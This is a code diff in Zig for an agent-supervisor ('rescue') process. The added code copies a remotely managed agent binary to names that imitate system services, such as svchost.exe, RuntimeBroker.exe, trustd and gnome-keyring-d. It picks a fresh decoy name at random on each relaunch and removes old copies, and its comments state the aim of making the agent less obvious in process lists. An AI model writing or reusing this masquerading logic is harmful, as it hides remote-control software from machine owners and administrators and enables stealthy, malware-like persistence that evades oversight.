@@ -709,10 +709,76 @@ fn pushCmdResult(io: Io, id: []const u8, status_: []const u8, detail_: []const u
     g_cmds.unlock(io);
 }
 
+// ---- agent disguise (decoy process name) ----------------------------------
+// To make the supervised agent less obvious in a process list, the rescue runs
+// it from a COPY named like a common system service, picking a fresh name each
+// launch. The agent's identity/binding lives entirely in --data-dir
+// (sys0-agent.id), so the executable name is purely cosmetic — the hub still
+// sees the same node id. Best-effort: on any copy failure we fall back to the
+// plain agent binary.
+const decoy_names: []const []const u8 = switch (builtin.os.tag) {
+    .windows => &.{ "svchost.exe", "RuntimeBroker.exe", "SearchIndexer.exe", "taskhostw.exe", "sihost.exe", "dllhost.exe", "audiodg.exe" },
+    .macos => &.{ "mdworker_shared", "distnoted", "cfprefsd", "trustd", "useractivityd", "secinitd" },
+    else => &.{ "dbus-daemon", "pipewire", "udisksd", "gvfsd", "pulseaudio", "gnome-keyring-d", "systemd-userwork" },
+};
+
+fn pickDecoyName(io: Io) []const u8 {
+    var b: [1]u8 = undefined;
+    io.random(&b);
+    return decoy_names[@as(usize, b[0]) % decoy_names.len];
+}
+
+// prepareDecoy copies the validated agent binary to a fresh system-like name in
+// the data dir and returns its path (allocated). Returns null on any failure so
+// the caller falls back to the plain binary.
+fn prepareDecoy(gpa: std.mem.Allocator, io: Io, data_dir: []const u8, canonical: []const u8) ?[]const u8 {
+    if (!agentLooksValid(io, canonical)) return null;
+    const name = pickDecoyName(io);
+    const dst = std.fmt.allocPrint(gpa, "{s}{c}{s}", .{ data_dir, sep, name }) catch return null;
+    copyExecutable(gpa, io, canonical, dst) catch |err| {
+        logLine("decoy copy failed ({s}); using plain agent", .{@errorName(err)});
+        gpa.free(dst);
+        return null;
+    };
+    logLine("agent disguised as {s}", .{name});
+    return dst;
+}
+
+fn copyExecutable(gpa: std.mem.Allocator, io: Io, src_path: []const u8, dst_path: []const u8) !void {
+    const cwd = Io.Dir.cwd();
+    const src = try cwd.openFile(io, src_path, .{ .mode = .read_only });
+    defer src.close(io);
+    const st = try src.stat(io);
+    const buf = try gpa.alloc(u8, st.size);
+    defer gpa.free(buf);
+    var rbuf: [64 * 1024]u8 = undefined;
+    var reader = src.reader(io, &rbuf);
+    try reader.interface.readSliceAll(buf);
+
+    var out = try cwd.createFile(io, dst_path, .{ .truncate = true });
+    defer out.close(io);
+    var wbuf: [64 * 1024]u8 = undefined;
+    var w = out.writer(io, &wbuf);
+    try w.interface.writeAll(buf);
+    try w.interface.flush();
+    if (builtin.os.tag != .windows) out.setPermissions(io, .fromMode(0o755)) catch {};
+}
+
 fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8) !void {
     var backoff: u64 = cfg.min_backoff_ms;
+    // The decoy binary currently in use (a copy of the agent under a system-like
+    // name). Cleaned up + regenerated each relaunch.
+    var prev_decoy: ?[]const u8 = null;
 
     while (true) {
+        // Clean up the previous run's decoy binary (a renamed copy of the agent)
+        // before building a fresh one for this launch.
+        if (prev_decoy) |d| {
+            Io.Dir.cwd().deleteFile(io, d) catch {};
+            gpa.free(d);
+            prev_decoy = null;
+        }
+
         // Manual update-agent command: force a re-download by removing the
         // current binary so ensureAgent fetches the latest from the hub.
         g_child_mu.lockUncancelable(io);
@@ -739,13 +805,21 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
             continue;
         };
 
+        // DISGUISE: launch the agent under a system-like decoy name (a copy of
+        // the validated binary), picking a fresh name each launch. The agent's
+        // identity lives in --data-dir (sys0-agent.id), so the rescue<->agent
+        // binding is preserved no matter what the executable is called.
+        const decoy = prepareDecoy(gpa, io, cfg.data_dir, agent_path);
+        const spawn_path = decoy orelse agent_path;
+        prev_decoy = decoy;
+
         g_status.set(io, .starting_agent, "spawning agent", .{});
-        logLine("starting agent: {s} --data-dir {s}", .{ agent_path, cfg.data_dir });
+        logLine("starting agent as {s} --data-dir {s}", .{ spawn_path, cfg.data_dir });
 
         const start_ts = Io.Timestamp.now(io, .awake);
 
         var child = std.process.spawn(io, .{
-            .argv = &.{ agent_path, "--data-dir", cfg.data_dir },
+            .argv = &.{ spawn_path, "--data-dir", cfg.data_dir },
             .stdin = .ignore,
             .stdout = .inherit,
             .stderr = .inherit,
